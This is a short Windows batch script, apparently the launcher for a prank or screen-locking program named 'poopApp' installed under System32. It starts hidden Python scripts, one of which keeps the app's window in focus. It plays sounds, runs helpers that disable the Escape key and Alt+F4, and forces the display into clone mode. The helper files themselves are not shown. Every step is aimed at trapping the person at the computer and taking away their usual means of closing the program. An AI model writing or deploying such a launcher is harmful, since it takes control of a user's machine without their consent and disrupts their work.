
@echo off

cd C:\Windows\System32\poopApp\final

START pythonw App.pyw &
START pythonw keepInFocus.pyw &

cd ../rsc/
CALL SoundPlayer.bat

CALL importEscapeOFF.bat
CALL setChanges.bat &
START disableAltF4.exe


cd C:/Windows/System32/
DisplaySwitch.exe /clone